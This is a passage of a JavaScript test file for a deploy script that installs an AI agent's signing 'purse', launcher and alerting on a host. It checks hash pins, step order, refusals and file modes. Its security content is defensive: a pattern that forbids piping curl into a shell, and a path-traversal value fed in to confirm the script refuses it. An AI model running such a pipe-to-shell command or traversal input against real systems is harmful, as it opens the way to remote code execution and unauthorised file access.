  const beatsStanza = config.slice(config.indexOf('/srv/wren/state/beats.jsonl {'), config.indexOf('/var/lib/wren/watchdog/alerts.jsonl {'));
  assert.match(beatsStanza, /^\s*su root wren$/m, 'the beats stanza must carry su root wren for the 2770 root:wren parent');
  const alertsStanza = config.slice(config.indexOf('/var/lib/wren/watchdog/alerts.jsonl {'));
  assert.doesNotMatch(alertsStanza, /^\s*su /m, 'the alerts parent is 0700 root:root and takes no su line');
  assert.equal((config.match(/^\s*copytruncate$/gm) || []).length, 2, 'both stanzas must carry the copytruncate directive');
  assert.match(config, /copytruncate/);

  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  assert.match(script, /mv \/tmp\/wren\.logrotate \/etc\/logrotate\.d\/wren/);
  assert.match(script, /logrotate --debug \/etc\/logrotate\.d\/wren/, 'the config must be parsed on the host');

  // The journal is bounded by journald, which logrotate cannot rotate.
  assert.match(readCloudInit(), /SystemMaxUse=200M/);
});

test('--seal reads a born key as <name>.key when the bare name is absent, and refuses when both are absent', () => {
  const pile = mkdtempSync(path.join(os.tmpdir(), 'wren-pile-'));
  writeFileSync(path.join(pile, 'wren-hot.key'), 'not-a-real-secret\n', { mode: 0o600 });
  const env = { ...process.env, WREN_PILE: pile, WREN_HOST: 'ops@192.0.2.1', WREN_DEPLOY_CONFIRMED: '1' };
  delete env.WREN_NO_NETWORK;
  const shown = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'wren-hot', '--dry-run'], { encoding: 'utf8', env });
  assert.equal(shown.status, 0, shown.stderr);
  assert.match(shown.stdout + shown.stderr, /wren-hot\.key/, 'the dry run must name the .key file it would read');
  // Not a dry run: --dry-run opens nothing by design, so the existence refusal is only reachable on
  // the real path, which refuses before it contacts the host.
  const missing = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'wren-ledger'], { encoding: 'utf8', env });
  assert.notEqual(missing.status, 0);
  assert.match(missing.stderr, /nothing at .*wren-ledger \(or .*wren-ledger\.key\)/);
});

test('the alert names its user agent; Cloudflare in front of Resend refused the default one with error 1010', () => {
  const alert = readFileSync(path.join(DO_DIR, 'bin', 'wren-alert'), 'utf8');
  const send = alert.slice(alert.indexOf('urllib.request.Request('), alert.indexOf('urlopen(request'));
  assert.match(send, /"User-Agent": "wren-alert\//, 'the Resend request must carry a named User-Agent');
});

test('N9: the README names the Resend sender as a gate before the first alert, not a footnote', () => {
  const readme = readFileSync(path.join(DO_DIR, 'README.md'), 'utf8');
  assert.match(readme, /verified/i);
  assert.match(readme, /weir\.social/);
  assert.match(
    readme,
    /before the first alert/i,
    'the README must say the sending domain has to be verified before the alert path is trusted',
  );
});

test('the deploy script and every library it added parse cleanly', () => {
  for (const file of [DEPLOY_SCRIPT, POST_BOOT, WATCHDOG, path.join(LIB_DIR, 'smoke-assert.sh'), path.join(DO_DIR, 'bin', 'wren-beat')]) {
    const result = spawnSync('bash', ['-n', file], { encoding: 'utf8' });
    assert.equal(result.status, 0, `${path.basename(file)}: ${result.stderr}`);
  }
  for (const file of [
    FIREWALL_MATCH,
    path.join(LIB_DIR, 'do_api.py'),
    path.join(LIB_DIR, 'record-run.py'),
    RETENTION,
    path.join(DO_DIR, 'bin', 'wren-alert'),
  ]) {
    const result = spawnSync('python3', ['-c', 'import ast,sys; ast.parse(open(sys.argv[1]).read())', file], {
      encoding: 'utf8',
    });
    assert.equal(result.status, 0, `${path.basename(file)}: ${result.stderr}`);
  }
});

// ---------------------------------------------------------------------------
// --install-purse: build order step 5 on the host. The sequence, the pins, the refusals.
// ---------------------------------------------------------------------------

const PURSE_UNIT = path.join(PKG_DIR, 'systemd', 'wren-purse.service');
const SHA_A = 'a'.repeat(64);
const SHA_B = 'b'.repeat(64);
const SHA_C = 'c'.repeat(64);

function installStubs({ failAt } = {}) {
  const dir = tmp('install-purse');
  const stubs = path.join(dir, 'stubs');
  mkdirSync(stubs);
  const orderFile = path.join(dir, 'order');
  writeFileSync(orderFile, '', 'utf8');
  const stub = (name, body) => {
    const file = path.join(stubs, name);
    writeFileSync(file, `#!/usr/bin/env bash\nprintf '%s\\n' "${name}" >> "$WREN_TEST_ORDER"\n${body}\n`, 'utf8');
    chmodSync(file, 0o755);
  };
  stub('build_purse_bundle', 'printf "bundle\\n" > "$1"');
  stub('install_node22', failAt === 'install_node22' ? 'exit 1' : 'echo "node present"');
  stub('ship_purse_files', 'echo "shipped $3 $4 $5"');
  stub('start_purse', failAt === 'start_purse' ? 'echo "host: refused - not active" >&2; exit 1' : 'echo "active"');
  stub('probe_purse', 'echo "refused and recorded"');
  // The documents that exist only once Wren's keys and vault are born, as a fixture: the members
  // document, the values with a vault id, and a rendered policy. Read by the deploy only because
  // WREN_NO_NETWORK=1 is set (see POLICY_DIR in the script); obviously fake ids, never real ones.
  const policyDir = path.join(dir, 'policy');
  mkdirSync(policyDir);
  writeFileSync(path.join(policyDir, 'wren-multisig.json'), JSON.stringify({ version: 1, threshold: 1, members: [] }), 'utf8');
  writeFileSync(path.join(policyDir, 'wren-chain.mainnet.json'), readFileSync(path.join(PKG_DIR, 'policy', 'wren-chain.mainnet.json'), 'utf8'), 'utf8');
  writeFileSync(path.join(policyDir, 'wren-values.json'), JSON.stringify({ WREN_VAULT_ID: `0x${'c'.repeat(64)}` }), 'utf8');
  writeFileSync(path.join(policyDir, 'wren-content.mainnet.json'), readFileSync(path.join(PKG_DIR, 'policy', 'wren-content.json'), 'utf8'), 'utf8');
  return {
    dir,
    orderFile,
    policyDir,
    records: path.join(dir, 'records'),
    env: {
      ...process.env,
      WREN_DEPLOY_CONFIRMED: '1',
      WREN_NO_NETWORK: '1',
      WREN_STUB_DIR: stubs,
      WREN_POLICY_DIR: policyDir,
      WREN_TEST_ORDER: orderFile,
      WREN_RUN_RECORD_DIR: path.join(dir, 'records'),
      WREN_HOST: 'ops@203.0.113.9',
    },
  };
}

test('--install-purse refuses until the values document carries the vault, and ignores WREN_POLICY_DIR outside the test seam', () => {
  const fixture = installStubs();
  writeFileSync(path.join(fixture.policyDir, 'wren-values.json'), JSON.stringify({ OPERATOR_ADDRESS: '0x1' }), 'utf8');
  const noVault = installRun(fixture);
  assert.notEqual(noVault.status, 0, 'no vault id, no purse');
  assert.match(noVault.stderr, /carries no WREN_VAULT_ID; birth the vault first/);
  assert.deepEqual(installOrder(fixture), [], 'nothing may run before the refusal');
  // Without the seam's gate the fixture directory is not read at all. Asserted on the script's
  // text rather than by running a real install against a fake host: the committed policy/ is
  // complete now that Wren is born, so a real run would proceed to the network.
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const seam = script.slice(script.indexOf('POLICY_DIR="$PKG_DIR/policy"'), script.indexOf('POLICY_DIR="$WREN_POLICY_DIR"') + 40);
  assert.match(seam, /if \[ "\$\{WREN_NO_NETWORK:-\}" = "1" \] && \[ -n "\$\{WREN_POLICY_DIR:-\}" \]; then\s+POLICY_DIR="\$WREN_POLICY_DIR"/, 'the override must sit behind WREN_NO_NETWORK=1 and nothing else');
  assert.equal((script.match(/WREN_POLICY_DIR/g) ?? []).length, 3, 'the seam variable is read in exactly one place (the comment, the test, the assignment)');
});

function installRun(fixture, extraEnv = {}) {
  return spawnSync('bash', [DEPLOY_SCRIPT, '--install-purse'], { encoding: 'utf8', env: { ...fixture.env, ...extraEnv } });
}

function installOrder(fixture) {
  return readFileSync(fixture.orderFile, 'utf8').trim().split('\n').filter(Boolean);
}

function installEvents(fixture) {
  const file = path.join(fixture.records, 'deploy-runs.jsonl');
  if (!existsSync(file)) return [];
  return readFileSync(file, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l).event);
}

test('--install-purse refuses without WREN_HOST, and without the word, before touching anything', () => {
  const fixture = installStubs();
  const noHost = spawnSync('bash', [DEPLOY_SCRIPT, '--install-purse'], { encoding: 'utf8', env: { ...fixture.env, WREN_HOST: '' } });
  assert.notEqual(noHost.status, 0);
  assert.match(noHost.stderr, /WREN_HOST is unset/);
  const noWord = installRun(fixture, { WREN_DEPLOY_CONFIRMED: '' });
  assert.notEqual(noWord.status, 0);
  assert.match(noWord.stderr, /WREN_DEPLOY_CONFIRMED is not 1/);
  assert.deepEqual(installOrder(fixture), [], 'nothing may be called before the preconditions pass');
  assert.deepEqual(installEvents(fixture), []);
});

test('--install-purse runs bundle, node, ship, start, probe in that order and records begin then succeeded', () => {
  const fixture = installStubs();
  const result = installRun(fixture);
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(installOrder(fixture), ['build_purse_bundle', 'install_node22', 'ship_purse_files', 'start_purse', 'probe_purse']);
  assert.deepEqual(installEvents(fixture), ['install-purse-begin', 'install-purse-succeeded']);
  assert.match(result.stdout, /pinned in the unit/);
  assert.match(result.stdout, /wren-beat\.service is NOT installed by this mode/);
});

test('--install-purse: a step that fails stops the sequence, records install-purse-failed with the step, and rolls back nothing', () => {
  const fixture = installStubs({ failAt: 'start_purse' });
  const result = installRun(fixture);
  assert.notEqual(result.status, 0);
  assert.deepEqual(installOrder(fixture), ['build_purse_bundle', 'install_node22', 'ship_purse_files', 'start_purse']);
  assert.deepEqual(installEvents(fixture), ['install-purse-begin', 'install-purse-failed']);
  assert.match(result.stderr, /at step 'start_purse'/);
  assert.match(result.stderr, /nothing is rolled back/);
  const record = readFileSync(path.join(fixture.records, 'deploy-runs.jsonl'), 'utf8').trim().split('\n').at(-1);
  assert.match(record, /step=start_purse/);
});

// Wren's unit carries a FOURTH substitution, the vault: it is rendered from the committed values
// document rather than typed into the unit as Heron's is, because Wren's vault does not exist until
// her keys are born and a placeholder that looks like an id is exactly the defect this package
// refuses everywhere else.
const VAULT_X = `0x${'c'.repeat(64)}`;

test('--install-purse: the rendered unit carries the three pins and the vault and no substitution, and refuses a pin or a vault that is not what it claims', () => {
  const rendered = spawnSync('bash', [DEPLOY_SCRIPT, '--render-purse-unit', SHA_A, SHA_B, SHA_C, VAULT_X], { encoding: 'utf8' });
  assert.equal(rendered.status, 0, rendered.stderr);
  const directives = rendered.stdout.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(directives, /<[A-Z_]+>/, 'a substitution was left in a directive of the rendered unit');
  assert.match(rendered.stdout, new RegExp(`${SHA_A} +/srv/wren/purse/dist/server\\.js`));
  assert.match(rendered.stdout, new RegExp(`${SHA_B} +/srv/wren/policy/wren-multisig\\.json`));
  assert.match(rendered.stdout, new RegExp(`--policy-sha256 ${SHA_C}`));
  assert.match(rendered.stdout, new RegExp(`--vault ${VAULT_X}`));
  assert.match(rendered.stdout, /--agent wren/);
  assert.match(rendered.stdout, /ExecStart=\/opt\/node22\/bin\/node \//);
  const bad = spawnSync('bash', [DEPLOY_SCRIPT, '--render-purse-unit', 'nope', SHA_B, SHA_C, VAULT_X], { encoding: 'utf8' });
  assert.notEqual(bad.status, 0);
  assert.match(bad.stderr, /is not a sha256/);
  const noVault = spawnSync('bash', [DEPLOY_SCRIPT, '--render-purse-unit', SHA_A, SHA_B, SHA_C], { encoding: 'utf8' });
  assert.notEqual(noVault.status, 0, 'a unit with no vault must not render');
  assert.match(noVault.stderr, /is not a vault id/);
  // The template the render reads is the one this package ships and tests.
  assert.match(readFileSync(PURSE_UNIT, 'utf8'), /<DIST_SHA256>[\s\S]*<MULTISIG_SHA256>[\s\S]*<POLICY_SHA256>[\s\S]*<VAULT_ID>/);
});

test('--install-purse: node 22 is pinned by version and a literal sha256, downloaded over https and verified before extraction', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  assert.match(script, /^NODE22_VERSION="22\.\d+\.\d+"$/m);
  assert.match(script, /^NODE22_SHA256="[0-9a-f]{64}"$/m);
  const remote = script.slice(script.indexOf('install_node22() {'), script.indexOf('ship_purse_files() {'));
  assert.match(remote, /https:\/\/nodejs\.org\/dist\/v\{version\}/);
  assert.match(remote, /sha256sum "\$TGZ"/);
  assert.ok(remote.indexOf('sha256sum "$TGZ"') < remote.indexOf('tar -xzf "$TGZ"'), 'the checksum must be verified before the tarball is extracted');
  assert.doesNotMatch(remote, /curl[^\n]*\|\s*(sh|bash)\b/);
  // The files ship with the modes the plan names, and are re-hashed on the host before install.
  const ship = script.slice(script.indexOf('ship_purse_files() {'), script.indexOf('start_purse() {'));
  assert.match(ship, /install -m 0640 -o purse -g purse "\$S\/server\.js" \/srv\/wren\/purse\/dist\/server\.js/);
  assert.match(ship, /install -m 0644 -o root -g root "\$S\/wren-multisig\.json"/);
  assert.match(ship, /install -m 0600 -o purse -g purse "\$S\/chain\.json" \/srv\/wren\/chain\.json/);
  assert.ok(ship.indexOf('check "$S/server.js"') < ship.indexOf('install -m 0640'), 'hashes are checked before anything is installed');
});

// ---------------------------------------------------------------------------
// --install-beat: the launcher, phase two, the flags, the units. Started by --smoke, never here.
// ---------------------------------------------------------------------------

function beatStubs({ failAt } = {}) {
  const dir = tmp('install-beat');
  const stubs = path.join(dir, 'stubs');
  mkdirSync(stubs);
  const orderFile = path.join(dir, 'order');
  writeFileSync(orderFile, '', 'utf8');
  const stub = (name, body) => {
    const file = path.join(stubs, name);
    writeFileSync(file, `#!/usr/bin/env bash\nprintf '%s\\n' "${name}" >> "$WREN_TEST_ORDER"\n${body}\n`, 'utf8');
    chmodSync(file, 0o755);
  };
  stub('build_phase2_bundle', 'printf "bundle\\n" > "$1"');
  stub('ship_beat_files', failAt === 'ship_beat_files' ? 'echo "host: refused" >&2; exit 1' : 'echo "shipped $3 $4"');
  return {
    orderFile,
    records: path.join(dir, 'records'),
    env: {
      ...process.env,
      WREN_DEPLOY_CONFIRMED: '1',
      WREN_NO_NETWORK: '1',
      WREN_STUB_DIR: stubs,
      WREN_TEST_ORDER: orderFile,
      WREN_RUN_RECORD_DIR: path.join(dir, 'records'),
      WREN_HOST: 'ops@203.0.113.9',
    },
  };
}

test('--install-beat runs the bundle then the ship, records begin then succeeded, and starts nothing', () => {
  const fixture = beatStubs();
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--install-beat'], { encoding: 'utf8', env: fixture.env });
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(installOrder(fixture), ['build_phase2_bundle', 'ship_beat_files']);
  assert.deepEqual(installEvents(fixture), ['install-beat-begin', 'install-beat-succeeded']);
  assert.match(result.stdout, /NOT started/);
  assert.doesNotMatch(readFileSync(DEPLOY_SCRIPT, 'utf8').slice(readFileSync(DEPLOY_SCRIPT, 'utf8').indexOf('ship_beat_files() {'), readFileSync(DEPLOY_SCRIPT, 'utf8').indexOf('# --status. Read-only')), /systemctl (enable|start)/, 'the install must not start the beat or enable a timer; that is the smoke\'s');
});

test('--install-beat: a failing ship records install-beat-failed with the step, and refuses without the word', () => {
  const failing = beatStubs({ failAt: 'ship_beat_files' });
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--install-beat'], { encoding: 'utf8', env: failing.env });
  assert.notEqual(result.status, 0);
  assert.deepEqual(installEvents(failing), ['install-beat-begin', 'install-beat-failed']);
  assert.match(result.stderr, /at step 'ship_beat_files'/);
  const noWord = spawnSync('bash', [DEPLOY_SCRIPT, '--install-beat'], { encoding: 'utf8', env: { ...beatStubs().env, WREN_DEPLOY_CONFIRMED: '' } });
  assert.notEqual(noWord.status, 0);
  assert.match(noWord.stderr, /WREN_DEPLOY_CONFIRMED is not 1/);
});

test('--install-beat: the rendered launcher carries the phase-two pin and no substitution, and refuses a pin that is not a sha256', () => {
  const rendered = spawnSync('bash', [DEPLOY_SCRIPT, '--render-wren-beat', SHA_A], { encoding: 'utf8' });
  assert.equal(rendered.status, 0, rendered.stderr);
  assert.match(rendered.stdout, new RegExp(`PHASE2_SHA256="${SHA_A}"`));
  const directives = rendered.stdout.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(directives, /<[A-Z_0-9]+>/);
  const bad = spawnSync('bash', [DEPLOY_SCRIPT, '--render-wren-beat', 'nope'], { encoding: 'utf8' });
  assert.notEqual(bad.status, 0);
});

test('the launcher: runs the image by its pinned id, refuses a tag mismatch, keeps the credential on tmpfs, and appends beats.jsonl', () => {
  const launcher = readFileSync(path.join(DO_DIR, 'bin', 'wren-beat'), 'utf8');
  assert.match(launcher, /docker image inspect --format '\{\{\.Id\}\}' wren:local/);
  assert.match(launcher, /"\$ACTUAL_ID" = "\$IMAGE_ID" \] \|\| refuse/);
  assert.match(launcher, /findmnt -n -o FSTYPE --target "\$CFG_ROOT"\)" = "tmpfs" \]/);
  assert.match(launcher, /install -m 0400 -o "\$CONTAINER_UID" -g "\$CONTAINER_GID" "\$CREDENTIALS_DIRECTORY\/openrouter"/);
  assert.match(launcher, /rm -rf "\$CFG"\n\n# --- phase two/, 'the credential copy must go before phase two runs');
  assert.match(launcher, />> "\$STATE\/beats\.jsonl"/);
  assert.match(launcher, /--mount "type=bind,source=\$CFG,target=\/app\/config,readonly=true"/);
  assert.doesNotMatch(launcher, /-e OPENROUTER|-e .*API_KEY/, 'no key ever crosses as an environment variable');
  // The docker flags the launcher reads are the file the image test pins.
  assert.match(launcher, /RUN_FLAGS="\$SRV\/run-flags\.txt"/);
});

test('the smoke beat and the status read their bodies from stdin as root; no multi-line `bash -c` string crosses ssh', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const smokeBeat = script.slice(script.indexOf('smoke_beat() {'), script.indexOf('smoke_enable_timers() {'));
  assert.match(smokeBeat, /sudo bash -s -- "\$start" <<'REMOTE'/);
  assert.doesNotMatch(smokeBeat, /bash -c "/);
  assert.match(smokeBeat, /tail -n 1 \/srv\/wren\/state\/beats\.jsonl/);
  const status = script.slice(script.indexOf('status_host() {'), script.indexOf('main() {'));
  assert.match(status, /sudo bash -s <<'REMOTE'/);
  assert.doesNotMatch(status, /bash -c "/);
});

test('--rebuild-image builds through the same on-host build as --create, records begin then succeeded, and refuses without the word', () => {
  const fixture = beatStubs();
  const stubsDir = fixture.env.WREN_STUB_DIR;
  writeFileSync(path.join(stubsDir, 'build_image_on_host'), `#!/usr/bin/env bash\nprintf '%s\\n' "build_image_on_host:$1" >> "$WREN_TEST_ORDER"\necho "image built"\n`, 'utf8');
  chmodSync(path.join(stubsDir, 'build_image_on_host'), 0o755);
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--rebuild-image'], { encoding: 'utf8', env: fixture.env });
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(installOrder(fixture), ['build_image_on_host:203.0.113.9']);
  assert.deepEqual(installEvents(fixture), ['rebuild-image-begin', 'rebuild-image-succeeded']);
  const noWord = spawnSync('bash', [DEPLOY_SCRIPT, '--rebuild-image'], { encoding: 'utf8', env: { ...fixture.env, WREN_DEPLOY_CONFIRMED: '' } });
  assert.notEqual(noWord.status, 0);
  assert.match(noWord.stderr, /WREN_DEPLOY_CONFIRMED is not 1/);
});

test('the on-host image build points the docker client away from /root/.docker, which the beat unit cannot see', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const build = script.slice(script.indexOf('build_image_on_host() {'), script.indexOf('install_host_units() {'));
  assert.match(build, /export DOCKER_CONFIG=\/tmp\/wren-docker-config/);
  assert.ok(build.indexOf('export DOCKER_CONFIG') < build.indexOf('docker build -t wren:local'), 'DOCKER_CONFIG must be set before docker build runs');
  assert.ok(build.includes('rm -rf "\\$DOCKER_CONFIG"'), 'the build-scoped config directory must be removed when the build is done');
});

test("the mail gate reads the message id from the alert unit's own invocation and waits for journald", () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const gate = script.slice(script.indexOf('smoke_mail_gate() {'), script.indexOf('smoke_beat() {'));
  assert.match(gate, /MAIL_START="\$\(date \+%s\)"/);
  assert.ok(gate.indexOf('MAIL_START="$(date +%s)"') < gate.indexOf('systemctl start wren-alert@smoke.service'), 'the start time is taken before the unit starts');
  assert.match(gate, /journalctl -u wren-alert@smoke\.service --since "@\$MAIL_START"/);
  assert.doesNotMatch(gate, /systemctl show -p InvocationID/, 'a finished oneshot carries no invocation id to filter on');
  assert.match(gate, /for i in \$\(seq 1 20\)/);
  assert.doesNotMatch(gate, /journalctl -u wren-alert@smoke\.service -n 50 --no-pager \| grep/);
});

test('--install-purse ships the policy WREN_POLICY_FILE names from the committed set, refuses one that is not there, and restarts the purse under it', () => {
  const fixture = installStubs();
  const chosen = spawnSync('bash', [DEPLOY_SCRIPT, '--install-purse'], { encoding: 'utf8', env: { ...fixture.env, WREN_POLICY_FILE: 'wren-content.mainnet.json' } });
  assert.equal(chosen.status, 0, chosen.stderr);
  assert.match(chosen.stdout, /from wren-content\.mainnet\.json/);
  const missing = spawnSync('bash', [DEPLOY_SCRIPT, '--install-purse'], { encoding: 'utf8', env: { ...installStubs().env, WREN_POLICY_FILE: 'nope.json' } });
  assert.notEqual(missing.status, 0);
  assert.match(missing.stderr, /is not a committed document/);
  const traversal = spawnSync('bash', [DEPLOY_SCRIPT, '--install-purse'], { encoding: 'utf8', env: { ...installStubs().env, WREN_POLICY_FILE: '../wren-multisig.json' } });
  assert.notEqual(traversal.status, 0);
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const start = script.slice(script.indexOf('start_purse() {'), script.indexOf('probe_purse() {'));
  assert.match(start, /systemctl restart wren-purse\.service/);
  assert.doesNotMatch(start, /systemctl enable --now/);
  assert.match(start, /\*"file \$POLICY_HASH_EXPECTED"\*\)/, 'the start must check the purse listens under the shipped file hash');
});

test('the launcher hands phase two the API origin and the policy address, and gives the model twenty tool steps', () => {
  const launcher = readFileSync(path.join(DO_DIR, 'bin', 'wren-beat'), 'utf8');
  assert.match(launcher, /^API_ORIGIN="https:\/\/weir\.social"$/m);
  assert.match(launcher, /--api-origin "\$API_ORIGIN" --address "\$AGENT_ADDRESS"/);
  assert.match(launcher, /AGENT_ADDRESS="\$\(python3 -c .*agentAddress.*wren-policy\.json/);
  assert.match(launcher, /cfg\["agents"\]\["defaults"\]\["max_tool_iterations"\] = 20/);
  // The purse unit signs statements for the same origin the launcher names.
  const unit = readFileSync(path.join(PKG_DIR, 'systemd', 'wren-purse.service'), 'utf8');
  assert.match(unit, /--api-origin https:\/\/weir\.social/);
  assert.match(unit, /--vault <VAULT_ID>/, 'the vault is a substitution the deploy fills from policy/wren-values.json');
  // The workspace names the ceiling the launcher renders, so the model is told the truth.
  const heartbeat = readFileSync(path.join(PKG_DIR, 'workspace', 'HEARTBEAT.md'), 'utf8');
  assert.match(heartbeat, /twenty tool calls/);
});
